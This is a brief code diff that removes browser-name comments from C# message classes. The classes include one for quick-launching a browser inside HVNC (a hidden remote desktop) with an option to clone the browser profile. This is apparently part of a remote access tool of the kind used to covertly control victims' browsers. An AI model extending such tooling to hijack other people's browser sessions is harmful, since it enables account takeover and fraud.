@@ -955,7 +955,7 @@ public class FileChunkMessage : Message
         }
 
         public bool Enable { get; set; }
-        public string BrowserType { get; set; } // Chrome, Firefox, Edge, Opera, OperaGX, Brave
+        public string BrowserType { get; set; } 
     }
 
     // Quick launch browser in HVNC
@@ -967,7 +967,7 @@ public class FileChunkMessage : Message
             Type = "HvncLaunchBrowser";
         }
 
-        public string BrowserType { get; set; } // Chrome, Firefox, Edge, Opera, OperaGX, Brave
+        public string BrowserType { get; set; }
         public bool CloneProfile { get; set; }
     }
 
